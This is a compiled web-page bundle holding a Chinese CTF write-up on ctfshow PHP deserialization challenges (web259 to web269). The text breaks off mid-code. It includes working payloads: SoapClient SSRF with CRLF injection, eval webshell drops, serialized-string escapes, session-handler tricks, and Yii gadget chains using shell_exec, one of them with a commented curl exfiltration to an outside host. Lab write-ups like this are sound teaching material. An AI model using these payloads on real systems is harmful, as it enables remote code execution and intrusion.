"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[6962],{28453:(n,e,r)=>{r.d(e,{R:()=>t,x:()=>l});var s=r(96540);const i={},c=s.createContext(i);function t(n){const e=s.useContext(c);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function l(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(i):n.components||i:t(n.components),s.createElement(c.Provider,{value:e},n.children)}},65774:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>a,contentTitle:()=>l,default:()=>o,frontMatter:()=>t,metadata:()=>s,toc:()=>p});const s=JSON.parse('{"id":"CTF/CTFSHOW/ctfshow\u53cd\u5e8f\u5217\u5316","title":"ctfshow\u53cd\u5e8f\u5217\u5316","description":"web259(CRLF,SSRF,SoapClient\u5185\u7f6e\u7c7b)","source":"@site/docs/CTF/CTFSHOW/ctfshow\u53cd\u5e8f\u5217\u5316.md","sourceDirName":"CTF/CTFSHOW","slug":"/CTF/CTFSHOW/ctfshow\u53cd\u5e8f\u5217\u5316","permalink":"/docs/CTF/CTFSHOW/ctfshow\u53cd\u5e8f\u5217\u5316","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/CTFSHOW/ctfshow\u53cd\u5e8f\u5217\u5316.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"ctfshowphp\u7279\u60273","permalink":"/docs/CTF/CTFSHOW/ctfshowphp\u7279\u60273"},"next":{"title":"ctfshow\u547d\u4ee4\u6267\u884c","permalink":"/docs/CTF/CTFSHOW/ctfshow\u547d\u4ee4\u6267\u884c"}}');var i=r(74848),c=r(28453);const t={},l=void 0,a={},p=[{value:"web259(CRLF,SSRF,SoapClient\u5185\u7f6e\u7c7b)",id:"web259crlfssrfsoapclient\u5185\u7f6e\u7c7b",level:2},{value:"web260(\u5b57\u7b26\u4e32\u5e8f\u5217\u5316)",id:"web260\u5b57\u7b26\u4e32\u5e8f\u5217\u5316",level:2},{value:"web261(\u5f31\u6bd4\u8f83\uff0c__unserialize\u7684\u5229\u7528)",id:"web261\u5f31\u6bd4\u8f83__unserialize\u7684\u5229\u7528",level:2},{value:"web262(\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u9003\u9038)",id:"web262\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u9003\u9038",level:2},{value:"web263(session\u53cd\u5e8f\u5217\u5316)",id:"web263session\u53cd\u5e8f\u5217\u5316",level:2},{value:"web264(\u5b57\u7b26\u4e32\u9003\u9038\uff0c262plus)",id:"web264\u5b57\u7b26\u4e32\u9003\u9038262plus",level:2},{value:"web265(\u5730\u5740\u4f20\u53c2)",id:"web265\u5730\u5740\u4f20\u53c2",level:2},{value:"web266(\u7ed5\u8fc7\u5f02\u5e38)",id:"web266\u7ed5\u8fc7\u5f02\u5e38",level:2},{value:"web267(yii\u6846\u67b6)",id:"web267yii\u6846\u67b6",level:2},{value:"web268(yii\u6846\u67b6)",id:"web268yii\u6846\u67b6",level:2},{value:"web269(yii\u6846\u67b6)",id:"web269yii\u6846\u67b6",level:2},{value:"web270(yii\u6846\u67b6)",id:"web270yii\u6846\u67b6",level:2},{value:"web275",id:"web275",level:2},{value:"web276(phar\u53cd\u5e8f\u5217\u5316)",id:"web276phar\u53cd\u5e8f\u5217\u5316",level:2},{value:"web278(python\u53cd\u5e8f\u5217\u5316)",id:"web278python\u53cd\u5e8f\u5217\u5316",level:2}];function h(n){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,c.R)(),...n.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(e.h2,{id:"web259crlfssrfsoapclient\u5185\u7f6e\u7c7b",children:"web259(CRLF,SSRF,SoapClient\u5185\u7f6e\u7c7b)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"//flag.php\r\n<?php\r\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\r\narray_pop($xff);\r\n$ip = array_pop($xff);\r\n\r\n\r\nif($ip!=='127.0.0.1'){\r\n\tdie('error');\r\n}else{\r\n\t$token = $_POST['token'];\r\n\tif($token=='ctfshow'){\r\n\t\tfile_put_contents('flag.txt',$flag);\r\n\t}\r\n}\r\n//index.php\r\n<?php\r\n\r\nhighlight_file(__FILE__);\r\n$vip = unserialize($_GET['vip']);\r\n//vip can get flag one key\r\n$vip->getFlag();\n"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u9996\u5148\u5f97\u5229\u7528ssrf\u8bbf\u95eeflag.php"}),"\n",(0,i.jsx)(e.p,{children:"\u67e5\u770bflag.php,\u9700\u8981\u5c06X-Forwarded-For\u6784\u9020\u4e3a127.0.0.1"}),"\n",(0,i.jsx)(e.p,{children:"\u7136\u540epost\u4f20\u53c2token=ctfshow"}),"\n"]}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"ssrf\u5728\u54ea\u5462\uff1f"}),"\n",(0,i.jsx)(e.p,{children:"PHP \u7684\u5185\u7f6e\u7c7b SoapClient \u662f\u4e00\u4e2a\u4e13\u95e8\u7528\u6765\u8bbf\u95eeweb\u670d\u52a1\u7684\u7c7b\uff0c\u53ef\u4ee5\u63d0\u4f9b\u4e00\u4e2a\u57fa\u4e8eSOAP\u534f\u8bae\u8bbf\u95eeWeb\u670d\u52a1\u7684 PHP \u5ba2\u6237\u7aef"}),"\n",(0,i.jsx)(e.p,{children:"\u8be5\u5185\u7f6e\u7c7b\u6709\u4e00\u4e2a __call \u65b9\u6cd5\uff0c\u5f53 __call \u65b9\u6cd5\u88ab\u89e6\u53d1\u540e\uff0c\u5b83\u53ef\u4ee5\u53d1\u9001 HTTP \u548c HTTPS \u8bf7\u6c42\u3002\u6b63\u662f\u8fd9\u4e2a __call \u65b9\u6cd5\uff0c\u4f7f\u5f97 SoapClient \u7c7b\u53ef\u4ee5\u88ab\u6211\u4eec\u8fd0\u7528\u5728 SSRF \u4e2d\u3002\u800c__call\u89e6\u53d1\u5f88\u7b80\u5355\uff0c\u5c31\u662f\u5f53\u5bf9\u8c61\u8bbf\u95ee\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\u7684\u65f6\u5019\u5c31\u4f1a\u89e6\u53d1\u3002"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"\\r\\n\u662fhttp\u5934\u4e4b\u95f4\u7684\uff0c\\r\\n\\r\\n\u662fhttp\u4e0epost\u6570\u636e\u5305\u4e4b\u95f4\u7684\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\n$target = 'http://127.0.0.1/flag.php';\r\n$post_string = 'token=ctfshow';\r\n$b = new SoapClient(null, array('location' => $target, 'user_agent' => 'ctfshow^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded' . '^^Content-Length: ' . (string)strlen($post_string) . '^^^^' . $post_string, 'uri' => \"ssrf\"));\r\n$a = serialize($b);\r\n$a = str_replace('^^', \"\\r\\n\", $a);\r\necho urlencode($a);\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53c2\u8003\u6587\u7ae0\uff1a"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html",children:"CRLF Injection"})}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.a,{href:"http://t.csdnimg.cn/JiWrw",children:"\u6d45\u8c08php\u539f\u751f\u7c7b\u7684\u5229\u7528 "})}),"\n",(0,i.jsx)(e.h2,{id:"web260\u5b57\u7b26\u4e32\u5e8f\u5217\u5316",children:"web260(\u5b57\u7b26\u4e32\u5e8f\u5217\u5316)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\n\r\nerror_reporting(0);\r\nhighlight_file(__FILE__);\r\ninclude('flag.php');\r\n\r\nif(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){\r\n    echo $flag;\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u53ea\u8981\u6709\u8fd9\u4e32\u5b57\u7b26\u4e32\u5c31\u884c\u4e86\uff0c\u76f4\u63a5\u4f20"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'ctfshow=ctfshow_i_love_36D\r\n//\u5e8f\u5217\u5316\u7ed3\u679c:s:18:"ctfshow_i_love_36D";\n'})}),"\n",(0,i.jsx)(e.h2,{id:"web261\u5f31\u6bd4\u8f83__unserialize\u7684\u5229\u7528",children:"web261(\u5f31\u6bd4\u8f83\uff0c__unserialize\u7684\u5229\u7528)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\n\r\nhighlight_file(__FILE__);\r\n\r\nclass ctfshowvip{\r\n    public $username;\r\n    public $password;\r\n    public $code;\r\n\r\n    public function __construct($u,$p){\r\n        $this->username=$u;\r\n        $this->password=$p;\r\n    }\r\n    public function __wakeup(){\r\n        if($this->username!='' || $this->password!=''){\r\n            die('error');\r\n        }\r\n    }\r\n    public function __invoke(){\r\n        eval($this->code);\r\n    }\r\n\r\n    public function __sleep(){\r\n        $this->username='';\r\n        $this->password='';\r\n    }\r\n    public function __unserialize($data){\r\n        $this->username=$data['username'];\r\n        $this->password=$data['password'];\r\n        $this->code = $this->username.$this->password;\r\n    }\r\n    public function __destruct(){\r\n        if($this->code==0x36d){\r\n            file_put_contents($this->username, $this->password);\r\n        }\r\n    }\r\n}\r\n\r\nunserialize($_GET['vip']); \n"})}),"\n",(0,i.jsx)(e.p,{children:"\u77e5\u8bc6\u70b9\uff1a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"__serialize\u548c__unserialize\u9b54\u672f\u65b9\u6cd5\r\n\r\n\u6ce8\u610f:\r\n\u8fd9\u4e24\u4e2a\u9b54\u672f\u65b9\u6cd5\u9700\u8981php7.4\u4ee5\u4e0a\u624d\u80fd\u751f\u6548\r\n\u5f53__serialize\u548c__sleep\u65b9\u6cd5\u540c\u65f6\u5b58\u5728\uff0c\u5e8f\u5217\u5316\u65f6\u5ffd\u7565__sleep\u65b9\u6cd5\u800c\u6267\u884c__serialize\uff1b\u5f53__unserialize\u65b9\u6cd5\u548c__wakeup\u65b9\u6cd5\u540c\u65f6\u5b58\u5728\uff0c\u53cd\u5e8f\u5217\u5316\u65f6\u5ffd\u7565__wakeup\u65b9\u6cd5\u800c\u6267\u884c__unserialize\r\n__unserialize\u7684\u53c2\u6570\uff1a\u5f53__serialize\u65b9\u6cd5\u5b58\u5728\u65f6\uff0c\u53c2\u6570\u4e3a__serialize\u7684\u8fd4\u56de\u6570\u7ec4\uff1b\u5f53__serialize\u65b9\u6cd5\u4e0d\u5b58\u5728\u65f6\uff0c\u53c2\u6570\u4e3a\u5b9e\u4f8b\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u503c\u7ec4\u5408\u800c\u6210\u7684\u6570\u7ec4\n"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"code==877.php.<?php eval($_POST[1]);?>\r\n\u56e0\u4e3a==\u4e3a\u5f31\u6bd4\u8f83\uff0c\u6240\u4ee5877.php==877\n"})}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nclass ctfshowvip\r\n{\r\n    public $username;\r\n    public $password;\r\n    public $code;\r\n    public function __construct()\r\n    {\r\n        $this->username = '877.php';\r\n        $this->password = '<?php eval($_POST[1]);';\r\n    }\r\n}\r\n$a = new ctfshowvip();\r\necho serialize($a);\n"})}),"\n",(0,i.jsx)(e.h2,{id:"web262\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u9003\u9038",children:"web262(\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u9003\u9038)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\nclass message{\r\n    public $from;\r\n    public $msg;\r\n    public $to;\r\n    public $token='user';\r\n    public function __construct($f,$m,$t){\r\n        $this->from = $f;\r\n        $this->msg = $m;\r\n        $this->to = $t;\r\n    }\r\n}\r\n\r\n$f = $_GET['f'];\r\n$m = $_GET['m'];\r\n$t = $_GET['t'];\r\n\r\nif(isset($f) && isset($m) && isset($t)){\r\n    $msg = new message($f,$m,$t);\r\n    $umsg = str_replace('fuck', 'loveU', serialize($msg));\r\n    setcookie('msg',base64_encode($umsg));\r\n    echo 'Your message has been sent';\r\n}\n"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u975e\u9884\u671f"}),"\n",(0,i.jsx)(e.p,{children:"\u5728message.php\u8bbe\u7f6ecookie\uff0c\u76f4\u63a5\u4f20\u5165"}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nclass message{\r\n    public $from;\r\n    public $msg;\r\n    public $to;\r\n    public $token='admin';\r\n    public function __construct($f,$m,$t){\r\n        $this->from = $f;\r\n        $this->msg = $m;\r\n        $this->to = $t;\r\n    }\r\n}\r\n$a = new message(1,1,1);\r\necho base64_encode(serialize($a));\n"})}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u9884\u671f\u89e3"}),"\n",(0,i.jsx)(e.p,{children:"\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u9003\u9038"}),"\n",(0,i.jsx)(e.p,{children:"\u628abase64\u7f16\u7801\u540e\u7684\u7ed3\u679c\u653e\u5230cookie\u91cc\u9762\u8bbf\u95eemessage.php\u5c31\u80fd\u62ff\u5230flag\u3002\u5f53\u7136\u6211\u4eec\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f20\u503c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'f=1&m=1&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}\n'})}),"\n"]}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nclass message\r\n{\r\n    public $from;\r\n    public $msg;\r\n    public $to;\r\n    public $token = 'user';\r\n    public function __construct($f, $m, $t)\r\n    {\r\n        $this->from = $f;\r\n        $this->msg = $m;\r\n        $this->to = $t;\r\n    }\r\n}\r\n$f = 1;\r\n$m = 1;\r\n$t = 'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";}';\r\n$msg = new message($f, $m, $t);\r\n$umsg = str_replace('fuck', 'loveU', serialize($msg));\r\necho $umsg;\r\nvar_dump(unserialize($umsg));\r\necho \"\\n\";\r\necho base64_encode($umsg);\n"})}),"\n",(0,i.jsx)(e.h2,{id:"web263session\u53cd\u5e8f\u5217\u5316",children:"web263(session\u53cd\u5e8f\u5217\u5316)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"// index.php \u5173\u952e\u4ee3\u7801\r\n\r\nif(isset($_SESSION['limit'])){\r\n\t\t$_SESSION['limti']>5?die(\"\u767b\u9646\u5931\u8d25\u6b21\u6570\u8d85\u8fc7\u9650\u5236\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);\r\n\t\t$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);\r\n\t}else{\r\n\t\t setcookie(\"limit\",base64_encode('1'));\r\n\t\t $_SESSION['limit']= 1;\r\n\t}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cclimit\u5199\u9519\u4e86\uff0c\u4f1a\u4e00\u76f4\u6267\u884c\u540e\u9762\u7684\u8bed\u53e5"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:"$_SESSION['limit']=base64_decode($_COOKIE['limit'])\n"})}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:'//check.php \u5173\u952e\u4ee3\u7801\r\nini_set(\'session.serialize_handler\', \'php\');\r\nclass User{\r\n    public $username;\r\n    public $password;\r\n    public $status;\r\n    function __construct($username,$password){\r\n        $this->username = $username;\r\n        $this->password = $password;\r\n    }\r\n    function setStatus($s){\r\n        $this->status=$s;\r\n    }\r\n    function __destruct(){\r\n        file_put_contents("log-".$this->username, "\u4f7f\u7528".$this->password."\u767b\u9646".($this->status?"\u6210\u529f":"\u5931\u8d25")."----".date_create()->format(\'Y-m-d H:i:s\'));\r\n    }\r\n}\n'})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cc\u7684\u914d\u7f6e\u9879\uff0csession.serialize_handler\u6709\u4e09\u79cd\u5904\u7406\u5668"}),"\n",(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:"\u5904\u7406\u5668"}),(0,i.jsx)(e.th,{children:"\u5bf9\u5e94\u7684\u5b58\u50a8\u683c\u5f0f"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:"php(\u9ed8\u8ba4)"}),(0,i.jsx)(e.td,{children:"\u952e\u540d+|+\u7ecfserialize()\u5e8f\u5217\u5316\u7684\u503c"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:"php_serialize(php>=5.5.4)"}),(0,i.jsx)(e.td,{children:"\u7ecfserialize()\u5e8f\u5217\u5316\u7684\u6570\u7ec4"})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:"php_binary"}),(0,i.jsx)(e.td,{children:"\u952e\u540d\u957f\u5ea6\u5bf9\u5e94\u7684ASCLL\u5b57\u7b26+\u952e\u540d+\u7ecfserialize()\u5e8f\u5217\u5316\u7684\u503c"})]})]})]}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u6ce8\u610f\uff1a\u5728 php 5.5.4 \u4ee5\u524d\u9ed8\u8ba4\u9009\u62e9\u7684\u662f php\uff0c5.5.4 \u4e4b\u540e\u5c31\u662f php_serialize\uff0c\u8fd9\u91cc\u7684 php \u7248\u672c\u4e3a 7.3.11\uff0c\u90a3\u4e48\u9ed8\u8ba4\u5c31\u662f php_serialize\u3002"}),"\n"]}),"\n",(0,i.jsx)(e.p,{children:"\u8be5\u9898\u76ee\u73af\u5883\u4e3aphp7.3.11\uff0c\u6240\u4ee5php.ini\u91cc\u7684\u914d\u7f6e\u9879\u5c31\u662fphp_serialize,\u5728index.php\u4e2d\u7684\u914d\u7f6e\u9879\u5c31\u662fphp_serialize"}),"\n",(0,i.jsx)(e.p,{children:"\u800cinc.php\u4e2d\u662fphp\uff0c\u6211\u4eec\u9700\u8981\u7528|\u6765\u5206\u9694\u5f00\u5e8f\u5217\u5316\u503c"}),"\n",(0,i.jsx)(e.p,{children:"payload\uff1a"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nclass User\r\n{\r\n    public $username;\r\n    public $password;\r\n    public $status;\r\n\r\n    function __construct($username, $password)\r\n    {\r\n        $this->username = $username;\r\n        $this->password = $password;\r\n    }\r\n}\r\n$user = new User('1.php','<?php eval($_POST[\"1\"]);?>');\r\necho base64_encode('|'.serialize($user));\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u9996\u5148\u5199\u5165cookie\uff0c\u8bbf\u95eeindex.php\uff0c\u63a5\u7740\u8bbf\u95eecheck.php\u751f\u6210\u6728\u9a6c\u6587\u4ef6\uff0c\u6700\u540e\u8bbf\u95eelog-1.php"}),"\n",(0,i.jsx)(e.h2,{id:"web264\u5b57\u7b26\u4e32\u9003\u9038262plus",children:"web264(\u5b57\u7b26\u4e32\u9003\u9038\uff0c262plus)"}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u4e2a\u9898\u76ee\u5427cookie\u6362\u6210session\uff0c\u6211\u4eec\u4e0d\u80fd\u4f20cookie\u4e86"}),"\n",(0,i.jsx)(e.p,{children:"\u6211\u4eec\u8fd8\u53ef\u4ee5\u76f4\u63a5\u4f20\u503c"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'f=1&m=1&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}\n'})}),"\n",(0,i.jsx)(e.h2,{id:"web265\u5730\u5740\u4f20\u53c2",children:"web265(\u5730\u5740\u4f20\u53c2)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nerror_reporting(0);\r\ninclude('flag.php');\r\nhighlight_file(__FILE__);\r\nclass ctfshowAdmin{\r\n    public $token;\r\n    public $password;\r\n\r\n    public function __construct($t,$p){\r\n        $this->token=$t;\r\n        $this->password = $p;\r\n    }\r\n    public function login(){\r\n        return $this->token===$this->password;\r\n    }\r\n}\r\n\r\n$ctfshow = unserialize($_GET['ctfshow']);\r\n$ctfshow->token=md5(mt_rand());\r\n\r\nif($ctfshow->login()){\r\n    echo $flag;\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u6309\u5730\u5740\u4f20\u53c2"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"$a='123';\r\n$b=&$a;\r\n$b=1;\r\necho $a;\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cca\u7684\u503c\u4f1a\u968f\u7740b\u7684\u503c\u8fdb\u884c\u6539\u53d8"}),"\n",(0,i.jsx)(e.p,{children:"payload"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nclass ctfshowAdmin{\r\n    public $token;\r\n    public $password;\r\n\r\n    public function __construct($t,$p){\r\n        $this->token=$t;\r\n        $this->password = &$this->token;\r\n    }\r\n    public function login(){\r\n        return $this->token===$this->password;\r\n    }\r\n}\r\n$a = new ctfshowAdmin('123','1234');\r\necho serialize($a);\n"})}),"\n",(0,i.jsx)(e.h2,{id:"web266\u7ed5\u8fc7\u5f02\u5e38",children:"web266(\u7ed5\u8fc7\u5f02\u5e38)"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nhighlight_file(__FILE__);\r\n\r\ninclude('flag.php');\r\n$cs = file_get_contents('php://input');\r\n\r\nclass ctfshow{\r\n    public $username='xxxxxx';\r\n    public $password='xxxxxx';\r\n    public function __construct($u,$p){\r\n        $this->username=$u;\r\n        $this->password=$p;\r\n    }\r\n    public function login(){\r\n        return $this->username===$this->password;\r\n    }\r\n    public function __toString(){\r\n        return $this->username;\r\n    }\r\n    public function __destruct(){\r\n        global $flag;\r\n        echo $flag;\r\n    }\r\n}\r\n$ctfshowo=@unserialize($cs);\r\nif(preg_match('/ctfshow/', $cs)){\r\n    throw new Exception(\"Error $ctfshowo\",1);\r\n}\n"})}),"\n",(0,i.jsx)(e.p,{children:"payload:"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nclass ctfshow{\r\n    public $username='xxxxxx';\r\n    public $password='xxxxxx';\r\n}\r\n$a = new ctfshow();\r\necho serialize($a);\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u65f6\u5019\u6211\u4eec\u9700\u8981\u5feb\u901f\u89e6\u53d1__destruct"}),"\n",(0,i.jsx)(e.p,{children:"\u59ff\u52bf\u4e00\uff1a"}),"\n",(0,i.jsx)(e.p,{children:"\u4fee\u6539\u5e8f\u5217\u5316\u5c5e\u6027\u4e2a\u6570\uff0c2->3\uff0c\u7c7b\u4f3c__wakeup\u7684\u7ed5\u8fc7"}),"\n",(0,i.jsx)(e.p,{children:"\u59ff\u52bf\u4e8c\uff1a"}),"\n",(0,i.jsx)(e.p,{children:"\u53bb\u6389\u751f\u6210\u7684\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u6700\u540e\u7684\u4e00\u4e2a\u5927\u62ec\u53f7"}),"\n",(0,i.jsxs)(e.blockquote,{children:["\n",(0,i.jsx)(e.p,{children:"\u8fd9\u9898\u8fd8\u53ef\u4ee5\u76f4\u63a5\u4e0d\u5199\u4efb\u4f55\u4e1c\u897f\uff08\u6709\u7c7b\u540d\u5c31\u884c\uff0c\u4e0d\u9700\u8981\u91cc\u9762\u7684\u5185\u5bb9\uff09"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:'O:7:"ctfshow":2:{}\n'})}),"\n"]}),"\n",(0,i.jsx)(e.h2,{id:"web267yii\u6846\u67b6",children:"web267(yii\u6846\u67b6)"}),"\n",(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240119121449709.png",alt:"image-20240119121449709"})}),"\n",(0,i.jsx)(e.p,{children:"\u5728\u7f51\u4e0a\u627e\u5230yii\u6846\u67b6\u7684poc"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nnamespace yii\\rest{\r\n    class CreateAction{\r\n        public $checkAccess;\r\n        public $id;\r\n\r\n        public function __construct(){\r\n           // $this->checkAccess = 'passthru';\r\n           // $this->id = 'tac /flag';\r\n           // $this->checkAccess = 'shell_exec';\r\n           // $this->id = 'curl `pwd|base64`.43zptel7.requestrepo.com'; //\u83b7\u53d6\u8def\u5f84\r\n            $this->checkAccess = 'shell_exec';\r\n            $this->id = \"echo '<?php eval(\\$_POST[1]);?>' > /var/www/html/basic/web/1.php\"; //\u5199\u5165\u6587\u4ef6\r\n        }\r\n    }\r\n}\r\n\r\nnamespace Faker{\r\n    use yii\\rest\\CreateAction;\r\n\r\n    class Generator{\r\n        protected $formatters;\r\n\r\n        public function __construct(){\r\n            $this->formatters['close'] = [new CreateAction(), 'run'];\r\n        }\r\n    }\r\n}\r\n\r\nnamespace yii\\db{\r\n    use Faker\\Generator;\r\n\r\n    class BatchQueryResult{\r\n        private $_dataReader;\r\n\r\n        public function __construct(){\r\n            $this->_dataReader = new Generator;\r\n        }\r\n    }\r\n}\r\nnamespace{\r\n    echo base64_encode(serialize(new yii\\db\\BatchQueryResult));\r\n}\r\n?>\n"})}),"\n",(0,i.jsx)(e.p,{children:"\u8fd9\u91cc\uff0cpassthru\uff0cshell_exec\u53ef\u4ee5\u7528\u7684"}),"\n",(0,i.jsx)(e.h2,{id:"web268yii\u6846\u67b6",children:"web268(yii\u6846\u67b6)"}),"\n",(0,i.jsx)(e.p,{children:"poc"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\n\r\nnamespace yii\\rest {\r\n    class CreateAction\r\n    {\r\n        public $checkAccess;\r\n        public $id;\r\n\r\n        public function __construct()\r\n        {\r\n            $this->checkAccess = 'passthru';\r\n            $this->id = 'tac /flags';\r\n        }\r\n    }\r\n}\r\n\r\nnamespace Faker {\r\n\r\n    use yii\\rest\\CreateAction;\r\n\r\n    class Generator\r\n    {\r\n        protected $formatters;\r\n\r\n        public function __construct()\r\n        {\r\n            // \u8fd9\u91cc\u9700\u8981\u6539\u4e3aisRunning\r\n            $this->formatters['isRunning'] = [new CreateAction(), 'run'];\r\n        }\r\n    }\r\n}\r\n\r\n// poc2\r\nnamespace Codeception\\Extension {\r\n\r\n    use Faker\\Generator;\r\n\r\n    class RunProcess\r\n    {\r\n        private $processes;\r\n\r\n        public function __construct()\r\n        {\r\n            $this->processes = [new Generator()];\r\n        }\r\n    }\r\n}\r\n\r\nnamespace {\r\n    // \u751f\u6210poc\r\n    echo base64_encode(serialize(new Codeception\\Extension\\RunProcess()));\r\n}\n"})}),"\n",(0,i.jsx)(e.h2,{id:"web269yii\u6846\u67b6",children:"web269(yii\u6846\u67b6)"}),"\n",(0,i.jsx)(e.p,{children:"poc"}),"\n",(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{className:"language-php",children:"<?php\r\nnamespace yii\\rest{\r\n    class CreateAction{\r\n        public $checkAccess;\r\n        public $id;\r\n\r\n        public function __construct(){\r\n            $this->checkAccess = 'passthru';\r\n            $this->id = 'tac /flagsa';\r\n        }\r\n    }\r\n}\r\n\r\nnamespace Faker{\r\n    use yii\\rest\\CreateAction;\r\n\r\n    class Generator{\r\n        protected $formatters;\r\n\r\n        public function __construct(){\r\n            // \u8fd9\u91cc\u9700\u8981\u6539\u4e3aisRunning\r\n            $this->formatters['render'] = [new CreateAction(), 'run'];\r\n        }\r\n    